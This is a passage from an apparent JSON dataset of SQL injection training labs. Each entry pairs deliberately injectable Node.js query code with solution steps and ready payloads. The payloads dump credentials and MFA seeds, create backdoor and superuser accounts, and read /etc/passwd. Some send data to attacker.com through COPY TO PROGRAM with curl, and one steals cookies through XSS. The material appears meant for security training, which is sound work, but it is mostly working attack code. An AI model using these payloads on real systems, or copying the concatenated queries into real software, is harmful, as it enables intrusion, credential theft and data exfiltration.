    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    node: (_, { id }) => {\n      const [type, dbId] = decodeGlobalId(id);\n      return db.query(`SELECT * FROM ${type} WHERE id = '${dbId}'`);\n    }\n  }\n};",
    "payloads": [
      "VXNlcjoxJyBVTklPTiBTRUxFQ1QgdGFibGVfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMtLQ==",
      "VXNlcjonIFVOSU9OIFNFTEVDVCBzY2hlbWFfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YS0t"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MongoDB Aggregation $convert to SQL Pipeline",
    "Lab Description": "A business intelligence system converts MongoDB aggregation pipelines to SQL for cross-database analytics. The $convert operator's expression evaluation fails to properly sanitize input when generating CAST operations in SQL. This allows breaking out of the aggregation context into raw SQL execution. The lab demonstrates how pipeline operators can become injection vectors when translated to relational queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable aggregation endpoints accepting $convert operations",
      "Craft malicious $convert expression: {\"$convert\":{\"input\":\"1\",\"to\":\"string\",\"onError\":\"'); SELECT * FROM payment_processor--\"}}",
      "Bypass type checking with nested $convert operations",
      "Leverage $function operator to execute stacked queries",
      "Exfiltrate sensitive financial data through error-based channel"
    ],
    "Vulnerability name": "Aggregation Pipeline SQL Injection",
    "srcCode": "app.post('/analytics', (req, res) => {\n  const pipeline = req.body.pipeline;\n  const sql = convertAggregationToSQL(pipeline);\n  db.query(`WITH report_data AS (${sql}) SELECT * FROM report_data`, (err, results) => {\n    if(err) return res.status(500).json({error: err.message});\n    res.json(results);\n  });\n});",
    "payloads": [
      "{\"$convert\":{\"input\":{\"$toString\":\"$amount\"},\"to\":\"double\",\"onError\":{\"$concat\":[\"'\",\"); COPY (SELECT * FROM transactions) TO PROGRAM 'curl attacker.com/?exfil=$(base64 /tmp/data)'--\"]}}}",
      "{\"$function\":{\"body\":\"function() { return SQL.execute('CREATE ROLE attacker SUPERUSER'); }\"}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JWT Token Validation Query",
    "Lab Description": "The JWT validation process checks token validity against database using unsanitized claims. To solve: Forge malicious JWT with SQLi in claims to bypass authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decode JWT to identify vulnerable claims",
      "Modify user_id claim: 1' OR '1'='1",
      "Add SQLi in custom claims: ' UNION SELECT 1,'admin','admin'--",
      "Sign modified token with weak secret",
      "Access admin functionality with forged token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function verifyToken(token) {\n  const decoded = jwt.verify(token, 'weak-secret');\n  const user = db.query(`SELECT * FROM users WHERE id = '${decoded.user_id}'`);\n  return user;\n}",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMScgT1IgJzEnPScxIn0.weak-signature",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCAnYWRtaW4nLCdhZG1pbictLSJ9.weak-signature"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CSV Export Field Terminator",
    "Lab Description": "A reporting tool allows custom CSV field terminators without validation. The terminator is used directly in SQL COPY command. To solve: Inject malicious terminators to execute OS commands.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept CSV export request",
      "Modify delimiter parameter: INTO OUTFILE '/tmp/test' FIELDS TERMINATED BY '=CMD|'",
      "Add command execution: LINES TERMINATED BY '/C calc.exe!'",
      "Trigger file processing on server",
      "Verify RCE through side effects"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export-csv', (req, res) => {\n  const { delimiter } = req.query;\n  db.query(`COPY (SELECT * FROM data) TO '/tmp/export.csv' WITH (FORMAT CSV, DELIMITER '${delimiter}')`);\n  res.download('/tmp/export.csv');\n});",
    "payloads": [
      "'=CMD|' LINES TERMINATED BY '/C calc.exe!'--",
      "0x3d434d447c204c494e4553205445524d494e4154454420425920272f432063616c632e65786521'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Full-Text Search Thesaurus",
    "Lab Description": "A search application loads custom thesaurus files from database. The thesaurus name parameter is vulnerable. To solve: Break thesaurus context to read arbitrary files.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable thesaurus parameter",
      "Break path context: english' FROM ts_debug('english','test') WHERE alias='word'--",
      "Read system files: pg_read_file('/etc/passwd')",
      "Access database configuration files",
      "Extract credentials from configs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { thesaurus } = req.query;\n  db.query(`ALTER TEXT SEARCH CONFIGURATION english ALTER MAPPING FOR word WITH ${thesaurus}`);\n  res.send('Thesaurus updated');\n});",
    "payloads": [
      "english' FROM ts_debug('english','test') WHERE alias='word'--",
      "simple, pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Array Constructor Function",
    "Lab Description": "A statistics dashboard builds array queries with user-controlled elements. The array constructor is vulnerable. To solve: Break array context to execute system commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable array parameter",
      "Break array syntax: ARRAY[1,2,3]::text) OR 1=1--",
      "Execute commands via COPY TO PROGRAM",
      "Exfiltrate data through network calls",
      "Verify command execution"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/stats', (req, res) => {\n  const { metrics } = req.query;\n  db.query(`SELECT array_to_json(ARRAY[${metrics}]) AS results`);\n  res.json(results);\n});",
    "payloads": [
      "1,2,3]::text) OR 1=1--",
      "1, (SELECT pg_read_file('/etc/passwd'))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Window Function Frame Clause",
    "Lab Description": "An analytics API allows custom window frame specifications. The ROWS BETWEEN clause is vulnerable. To solve: Break frame context to dump user credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable frame parameter",
      "Break frame syntax: ROWS BETWEEN 1 PRECEDING AND 1) UNION SELECT 1,username,password FROM users--",
      "Exfiltrate data through aggregate functions",
      "Bypass row-level security",
      "Access restricted analytics"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const { frame } = req.query;\n  db.query(`SELECT AVG(value) OVER (ORDER BY date ${frame}) FROM metrics`);\n  res.json(results);\n});",
    "payloads": [
      "ROWS BETWEEN 1 PRECEDING AND 1) UNION SELECT 1,username,password FROM users--",
      "ROWS UNBOUNDED PRECEDING) EXECUTE IMMEDIATE 'COPY (SELECT * FROM secrets) TO ''/tmp/leak.csv'''--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JSON Path Query",
    "Lab Description": "A document store exposes JSON path queries that get converted to SQL. The jsonpath parameter is vulnerable. To solve: Break path context to read arbitrary tables.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable jsonpath parameter",
      "Break path syntax: $.user') OR 1=1--",
      "Access JSON storage internals",
      "Extract all documents through path traversal",
      "Bypass document-level permissions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-docs', (req, res) => {\n  const { path } = req.query;\n  db.query(`SELECT jsonb_path_query(doc, '${path}') FROM documents`);\n  res.json(results);\n});",
    "payloads": [
      "$.user') OR 1=1--",
      "$.user'')) FROM jsonb_array_elements(doc->'users') WHERE (doc->>'password') LIKE 'a%'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Recursive CTE Base Case",
    "Lab Description": "An org chart viewer builds recursive CTEs with user input in anchor member. The WITH RECURSIVE clause is vulnerable. To solve: Break recursion to access arbitrary tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable root node parameter",
      "Break CTE syntax: 1) UNION SELECT 1,username,password FROM users--",
      "Access recursive query internals",
      "Exfiltrate data through depth-limited recursion",
      "Bypass hierarchical access controls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/org-chart', (req, res) => {\n  const { root } = req.query;\n  db.query(`WITH RECURSIVE hierarchy AS (\n    SELECT * FROM employees WHERE id = ${root}\n    UNION SELECT e.* FROM employees e JOIN hierarchy h ON e.manager_id = h.id\n  ) SELECT * FROM hierarchy`);\n  res.json(results);\n});",
    "payloads": [
      "1) UNION SELECT 1,username,password FROM users--",
      "1 OR EXISTS(SELECT * FROM sensitive_departments)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Custom Aggregate Function",
    "Lab Description": "A statistics application registers custom aggregates that use unsanitized input. The final function parameter is vulnerable. To solve: Break aggregate context to execute commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable aggregate function",
      "Break function syntax: my_agg(1) FROM (SELECT 1) x) OR 1=1--",
      "Access aggregate function internals",
      "Execute commands through extension functions",
      "Bypass aggregation constraints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/stats', (req, res) => {\n  const { param } = req.query;\n  db.query(`SELECT my_custom_agg(${param}) FROM metrics`);\n  res.json(results);\n});",
    "payloads": [
      "1) FROM (SELECT 1) x) OR 1=1--",
      "1); SELECT pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "SQL injection in mobile app profile update endpoint",
    "Lab Description": "The mobile app allows users to update their profile information. The `name` parameter is directly inserted into an UPDATE SQL query without sanitization. Error messages are displayed. To solve: Perform SQL injection to extract database schema information and modify other users' data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept profile update request with Burp Suite",
      "Test for errors with payload: test'",
      "Extract version with: test', email=(SELECT @@version)--",
      "Enumerate tables: test', email=(SELECT table_name FROM information_schema.tables LIMIT 1)--",
      "Modify admin data: test', is_admin=1 WHERE username='admin'--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/update-profile', (req, res) => {\n  const { name, username } = req.body;\n  const query = `UPDATE users SET name='${name}' WHERE username='${username}'`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('Profile updated');\n  });\n});",
    "payloads": [
      "test', email=(SELECT @@version)--",
      "test', is_admin=1 WHERE username='admin'--"
    ]
  },
  {
    "Lab scenario": "Error-based SQL injection in shopping cart total",
    "Lab Description": "The shopping cart calculates totals by querying product prices using product IDs. Detailed errors are reflected in responses. To solve: Extract database schema and contents through error messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send malformed product ID: 1'",
      "Confirm error leakage in response",
      "Extract version: 1 AND 1=CONVERT(int, @@version)--",
      "Enumerate tables: 1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))--",
      "Dump column data through errors"
    ],
    "Vulnerability name": "Error-based SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/cart-total', (req, res) => {\n  const id = req.query.product;\n  const query = `SELECT price FROM products WHERE id=${id}`;\n  db.query(query, (err, result) => {\n    if (err) return res.status(500).json({ error: err.message });\n    res.json({ total: result.rows[0].price });\n  });\n});",
    "payloads": [
      "1 AND 1=CONVERT(int, @@version)--",
      "1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))--"
    ]
  },
  {
    "Lab scenario": "SQL injection via hidden form field in registration form",
    "Lab Description": "A hidden referrer field in the registration form is used directly in SQL queries. The application returns query results in the response. To solve: Use UNION-based injection to extract user credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept registration request with Burp Suite",
      "Modify referrer field: ' UNION SELECT username,password FROM users--",
      "Determine correct number of columns first",
      "Extract admin credentials from response",
      "Verify by logging in with stolen credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/register', (req, res) => {\n  const { username, referrer } = req.body;\n  const query = `INSERT INTO users (username, referrer) VALUES ('${username}', '${referrer}') RETURNING *`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "' UNION SELECT username,password FROM users--",
      "' UNION SELECT null,table_name FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "Second-order SQL injection via stored user bio",
    "Lab Description": "User bios are stored and later used unsafely in admin search queries. No immediate feedback is available. To solve: Store malicious payload and trigger when admin searches user bios.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Update bio to: '; INSERT INTO backdoor VALUES ('hacker','123')--",
      "Wait for admin to search bios",
      "Verify backdoor account creation",
      "Login with backdoor credentials",
      "Document delayed exploitation"
    ],
    "Vulnerability name": "Second-order SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/update-bio', (req, res) => {\n  const { bio } = req.body;\n  const query = `UPDATE users SET bio='${bio}' WHERE id=${req.user.id}`;\n  db.query(query);\n  res.send('Bio updated');\n});\n\napp.get('/admin/search-bios', (req, res) => {\n  const { term } = req.query;\n  const query = `SELECT * FROM users WHERE bio LIKE '%${term}%'`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "'; INSERT INTO backdoor VALUES ('hacker','123')--",
      "' UNION SELECT username,password FROM users WHERE '1'='1"
    ]
  },
  {
    "Lab scenario": "SQL injection in password reset token check",
    "Lab Description": "The password reset endpoint checks tokens without sanitization. Different responses indicate valid/invalid tokens. To solve: Use boolean-based injection to bypass token validation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept reset request: /reset?token=abc",
      "Test with: abc' OR '1'='1",
      "Confirm access to reset form",
      "Target specific user: abc' OR email='admin@example.com'--",
      "Reset admin password"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/reset-password', (req, res) => {\n  const { token } = req.query;\n  const query = `SELECT * FROM password_resets WHERE token='${token}' AND expires_at > NOW()`;\n  db.query(query, (err, result) => {\n    if (result.rows.length) {\n      return res.render('reset-form');\n    }\n    res.send('Invalid token');\n  });\n});",
    "payloads": [
      "abc' OR '1'='1",
      "xyz' OR email='admin@example.com'--"
    ]
  },
  {
    "Lab scenario": "SQL injection via HTTP Referer header in audit logs",
    "Lab Description": "Referer headers are logged directly into SQL. The admin panel displays logs with limited escaping. To solve: Inject XSS and SQLi payloads to steal admin cookies.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send request with Referer: attacker.com' UNION SELECT CONCAT('<script>alert(1)</script>',table_name) FROM information_schema.tables--",
      "Wait for admin to view logs",
      "Capture admin cookie via XSS",
      "Extract data through combined attack",
      "Document multi-vector exploit"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  const referer = req.headers.referer || 'direct';\n  const query = `INSERT INTO access_logs (referer) VALUES ('${referer}')`;\n  db.query(query);\n  next();\n});",
    "payloads": [
      "attacker.com' UNION SELECT CONCAT('<script>alert(1)</script>',table_name) FROM information_schema.tables--",
      "evil.com' UNION SELECT CONCAT('<img src=x onerror=fetch(`http://attacker.com?cookie=${document.cookie}`)>')--"
    ]
  },
  {
    "Lab scenario": "Boolean SQL injection in mobile banking app login",
    "Lab Description": "The login endpoint returns different responses for valid/invalid credentials. No direct output. To solve: Use boolean conditions to extract admin password hash character by character.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login request",
      "Test with: admin' AND 1=1-- (valid) vs admin' AND 1=2-- (invalid)",
      "Extract password length: admin' AND LENGTH(password)=32--",
      "Brute-force each character: admin' AND SUBSTRING(password,1,1)='a'--",
      "Reconstruct full hash"
    ],
    "Vulnerability name": "Boolean-based blind SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n  db.query(query, (err, result) => {\n    if (result.rows.length) {\n      return res.json({ status: 'success' });\n    }\n    res.json({ status: 'failure' });\n  });\n});",
    "payloads": [
      "admin' AND 1=1--",
      "admin' AND SUBSTRING(password,1,1)='a'--"
    ]
  },
  {
    "Lab scenario": "UNION-based SQLi in forum's search feature",
    "Lab Description": "The forum search directly embeds terms in SQL and returns full results. To solve: Use UNION injection to extract database version, tables, and user credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search for: test' ORDER BY 5-- to find columns",
      "Inject: test' UNION SELECT 1,@@version,3,4--",
      "Extract tables: test' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--",
      "Dump credentials: test' UNION SELECT 1,username,password,4 FROM users--",
      "Document extracted data"
    ],
    "Vulnerability name": "UNION-based SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/forum/search', (req, res) => {\n  const { q } = req.query;\n  const query = `SELECT id, title, excerpt, author FROM posts WHERE title LIKE '%${q}%'`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "test' UNION SELECT 1,@@version,3,4--",
      "test' UNION SELECT 1,username,password,4 FROM users--"
    ]
  },
  {
    "Lab scenario": "Time-based SQLi in password verification API",
    "Lab Description": "The password verification API has identical responses but vulnerable to timing attacks. To solve: Use SLEEP() to extract admin password character by character.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Measure baseline response time",
      "Test with: admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(3),0)--",
      "Confirm timing difference for valid characters",
      "Automate extraction with Python script",
      "Reconstruct full password hash"
    ],
    "Vulnerability name": "Time-based blind SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/verify-password', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n  db.query(query, (err, result) => {\n    res.json({ valid: result.rows.length > 0 });\n  });\n});",
    "payloads": [
      "admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(3),0)--",
      "admin' AND IF(ASCII(SUBSTRING(password,1,1))>100,SLEEP(3),0)--"
    ]
  },
  {
    "Lab scenario": "SQLi in e-learning platform course filter",
    "Lab Description": "The course topic filter is vulnerable to UNION-based injection. Results are displayed in the UI. To solve: Extract database version, schema, and user credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Filter by topic: ' ORDER BY 5-- to find columns",
      "Inject: ' UNION SELECT 1,@@version,3--",
      "Extract tables: ' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
      "Dump credentials: ' UNION SELECT 1,username,password FROM users--",
      "Verify by logging in with stolen credentials"
    ],
    "Vulnerability name": "UNION-based SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/courses', (req, res) => {\n  const { topic } = req.query;\n  const query = `SELECT id, name, instructor FROM courses WHERE topic='${topic}'`;\n  db.query(query, (err, results) => {\n    res.render('courses', { courses: results.rows });\n  });\n});",
    "payloads": [
      "' UNION SELECT 1,@@version,3--",
      "' UNION SELECT 1,username,password FROM users--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in IoT Device Location Tracker",
    "Lab Description": "An IoT tracking system stores device location coordinates in a PostgreSQL database. The coordinate update endpoint directly concatenates latitude/longitude values into a geospatial query without sanitization. The application uses PostGIS functions that can be exploited to break out of the coordinate context. To solve: Exploit the ST_MakePoint function parameter injection to execute system commands through PostGIS extension functions and exfiltrate all device location history.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the device location update request containing latitude/longitude parameters",
      "Identify vulnerable parameter by testing with malformed coordinates: 0); SELECT 1--",
      "Break out of ST_MakePoint context: 0,0); COPY (SELECT * FROM devices) TO PROGRAM 'curl attacker.com/?leak=$(base64 /tmp/data)'--",
      "Verify data exfiltration by checking attacker server logs",
      "Escalate to RCE by loading malicious PostGIS extension"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-location', (req, res) => {\n  const { deviceId, lat, lng } = req.body;\n  const query = `UPDATE devices SET location = ST_MakePoint(${lat}, ${lng}) WHERE id = '${deviceId}'`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('Location updated');\n  });\n});",
    "payloads": [
      "0,0); COPY (SELECT * FROM devices) TO PROGRAM 'curl attacker.com/?leak=$(base64 /tmp/data)'--",
      "0,0); SELECT pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "GraphQL Query Depth Exploitation Leading to SQL Injection",
    "Lab Description": "A GraphQL API implements custom depth limiting that fails to properly sanitize nested query parameters. The query depth protection can be bypassed through specially crafted aliases, allowing access to underlying SQL queries. The vulnerability exists in the connection resolver that builds raw SQL for pagination. To solve: Craft a deeply nested GraphQL query that bypasses depth limits and injects malicious SQL through the 'after' cursor parameter to extract the entire database schema.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema to identify connection types",
      "Construct query with excessive depth using fragment spreading",
      "Bypass depth limit by varying query structure with aliases",
      "Inject into cursor parameter: {\"after\":\"1' UNION SELECT schema_name FROM information_schema.schemata--\"}",
      "Extract complete database metadata through recursive queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    products: (_, { after }) => {\n      const where = after ? `WHERE id > '${after}'` : '';\n      return db.query(`SELECT * FROM products ${where} LIMIT 10`);\n    }\n  }\n};",
    "payloads": [
      "{\"after\":\"1' UNION SELECT schema_name FROM information_schema.schemata--\"}",
      "{\"after\":\"1' UNION SELECT table_name,column_name FROM information_schema.columns--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Machine Learning Feature Store",
    "Lab Description": "A machine learning platform stores feature definitions in a SQL database. The feature retrieval endpoint dynamically builds queries using unsanitized feature names from user input. The application uses a custom DSL that gets translated to SQL, introducing injection points in the WHERE clause generation. To solve: Exploit the feature name parameter to break out of the DSL context and perform a UNION-based attack to extract sensitive model training data, including PII used in model features.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable feature name parameter in API requests",
      "Reverse engineer the DSL to SQL translation logic",
      "Break DSL context with: valid_feature' UNION SELECT user_ssn FROM training_data--",
      "Extract all PII columns from training datasets",
      "Exfiltrate model metadata containing sensitive data mappings"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/features', (req, res) => {\n  const { feature } = req.query;\n  const query = translateDSLToSQL(`SELECT value FROM features WHERE name = '${feature}'`);\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "valid_feature' UNION SELECT user_ssn FROM training_data--",
      "test' UNION SELECT model_parameters FROM ml_models WHERE '1'='1"
    ]
  },
  {
    "Lab scenario": "Blind SQL Injection in Healthcare Appointment System",
    "Lab Description": "A hospital appointment booking system contains a blind SQL injection vulnerability in the patient lookup functionality. The application provides different error messages for existing vs. non-existing patient IDs, enabling boolean-based inference attacks. No direct results are returned, but the response content length differs based on query results. To solve: Use conditional boolean queries to extract sensitive patient medical records one character at a time, including diagnoses and treatment histories.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable patient ID parameter through error differentials",
      "Confirm boolean injection with: 123' AND 1=1-- (success) vs 123' AND 1=2-- (failure)",
      "Extract database version: 123' AND SUBSTRING(@@version,1,1)='5'--",
      "Enumerate table structure through binary search queries",
      "Dump sensitive medical records character by character"
    ],
    "Vulnerability name": "Boolean-based blind SQL injection",
    "srcCode": "app.post('/find-patient', (req, res) => {\n  const { patientId } = req.body;\n  const query = `SELECT * FROM patients WHERE id = '${patientId}'`;\n  db.query(query, (err, results) => {\n    if (results.rows.length) {\n      return res.send('Patient exists');\n    }\n    res.send('Patient not found');\n  });\n});",
    "payloads": [
      "123' AND SUBSTRING(@@version,1,1)='5'--",
      "456' AND (SELECT ASCII(SUBSTRING(diagnosis,1,1)) FROM medical_records WHERE patient_id=1)>50--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Digital Asset Management System",
    "Lab Description": "A DAM system stores metadata about digital assets in a SQL database. The asset search functionality directly embeds user-controlled sort parameters into ORDER BY clauses without sanitization. While most SQL injection filters focus on WHERE clauses, the ORDER BY injection allows limited data exfiltration through careful timing attacks. To solve: Exploit the sort direction parameter to perform a time-based attack extracting AWS S3 bucket names and access keys stored in the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable sort parameter in asset search requests",
      "Confirm injection with: CASE WHEN 1=1 THEN 1 ELSE 2 END--",
      "Develop timing attack: (CASE WHEN (SELECT SUBSTRING(access_key,1,1) FROM storage_config)='A' THEN SLEEP(5) ELSE 1 END)",
      "Automate key extraction with incremental character guessing",
      "Verify extracted credentials by accessing S3 buckets"
    ],
    "Vulnerability name": "Time-based SQL injection in ORDER BY",
    "srcCode": "app.get('/assets', (req, res) => {\n  const { sort } = req.query;\n  const query = `SELECT * FROM digital_assets ORDER BY ${sort || 'id'} LIMIT 100`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "(CASE WHEN (SELECT SUBSTRING(access_key,1,1) FROM storage_config)='A' THEN SLEEP(5) ELSE 1 END)",
      "(SELECT IF(ASCII(SUBSTRING(bucket_name,1,1))>50,SLEEP(3),0) FROM storage_config)"
    ]
  },
  {
    "Lab scenario": "Second-Order SQL Injection in CMS Template System",
    "Lab Description": "A content management system allows administrators to create dynamic page templates that get processed through a SQL-powered rendering engine. User-provided template code is initially sanitized when stored, but gets re-embedded into SQL queries during page rendering without proper escaping. To solve: Store malicious template code containing SQL injection payloads that execute when pages are viewed, enabling privilege escalation to superadmin by modifying backend permissions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a new page template containing: {% raw %}{{ '}}'; UPDATE users SET role='superadmin' WHERE username='attacker'--}}{% endraw %}",
      "Wait for template rendering job to execute",
      "Verify privilege escalation by accessing admin panel",
      "Investigate delayed execution through database logs",
      "Document second-order attack chain"
    ],
    "Vulnerability name": "Second-order SQL injection",
    "srcCode": "app.post('/render-template', (req, res) => {\n  const { templateId } = req.body;\n  const query = `SELECT content FROM templates WHERE id = ${templateId}`;\n  db.query(query, (err, result) => {\n    const rendered = renderWithSQL(result.rows[0].content);\n    res.send(rendered);\n  });\n});",
    "payloads": [
      "{% raw %}{{ '}}'; UPDATE users SET role='superadmin' WHERE username='attacker'--}}{% endraw %}",
      "{% raw %}{{ '}}'; INSERT INTO backdoor VALUES ('attacker','payload')--}}{% endraw %}"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQL Injection in Hybrid Analytics Dashboard",
    "Lab Description": "An analytics dashboard accepts MongoDB-style queries that get converted to SQL for reporting. The $match stage translation improperly handles nested query operators, allowing injection into the generated SQL. The application uses a custom query DSL that fails to properly escape MongoDB's $where clause when converting to SQL. To solve: Craft a malicious $where condition that breaks out of the JavaScript context and executes arbitrary SQL to extract all reporting data and underlying source databases.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $match parameter in reporting API",
      "Break JS context with: {$where: \"1; return true\"}",
      "Enter SQL context: {$where: \"1); SELECT * FROM sensitive_reports--\"}",
      "Exfiltrate data through stacked queries",
      "Map complete database structure through injection"
    ],
    "Vulnerability name": "NoSQL to SQL injection",
    "srcCode": "app.post('/analytics', (req, res) => {\n  const { filters } = req.body;\n  const sql = convertMongoToSQL(filters);\n  db.query(`SELECT * FROM reports WHERE ${sql}`, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "{$where: \"1); SELECT * FROM sensitive_reports--\"}",
      "{$expr: {$function: {body: \"function() { return SQL.execute('SELECT @@version'); }\"}}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Financial Trading Algorithm Config",
    "Lab Description": "A stock trading platform allows configuring algorithmic trading strategies through JSON parameters that get converted to SQL WHERE clauses. The strategy condition builder fails to properly sanitize comparison operators in the JSON-to-SQL conversion. To solve: Exploit the custom operator syntax to break out of the condition context and perform a UNION-based attack to extract all trading algorithms, including proprietary strategies and associated account credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze strategy config API requests",
      "Identify vulnerable operator parameter in JSON conditions",
      "Break condition context with: {\"field\":\"price\",\"op\":\"> 100); SELECT * FROM trading_algorithms--\"}",
      "Extract algorithm source code and credentials",
      "Document intellectual property theft"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/save-strategy', (req, res) => {\n  const { conditions } = req.body;\n  const where = conditions.map(c => `${c.field} ${c.op} ${c.value}`).join(' AND ');\n  const query = `INSERT INTO strategies (conditions) VALUES ('${where}')`;\n  db.query(query, (err) => {\n    res.send('Strategy saved');\n  });\n});",
    "payloads": [
      "{\"field\":\"price\",\"op\":\"> 100); SELECT * FROM trading_algorithms--\"}",
      "{\"field\":\"1\",\"op\":\"=1); COPY strategies TO PROGRAM 'curl attacker.com/?leak=$(base64 /tmp/strategies)'--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Multi-Factor Authentication Setup",
    "Lab Description": "The MFA enrollment process stores device information in a SQL database. The device identifier parameter is vulnerable to injection during the verification step. The application provides different error messages for valid/invalid device IDs, enabling boolean-based attacks. To solve: Use conditional error responses to extract the MFA seed secrets for all users, allowing complete bypass of multi-factor authentication across the application.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept MFA device verification request",
      "Test boolean conditions: deviceId' AND 1=1-- (success) vs deviceId' AND 1=2-- (failure)",
      "Extract MFA seeds: deviceId' AND SUBSTRING((SELECT mfa_seed FROM users WHERE username='admin'),1,1)='A'--",
      "Reconstruct all MFA seeds through incremental extraction",
      "Generate valid OTP tokens for any account"
    ],
    "Vulnerability name": "Boolean-based blind SQL injection",
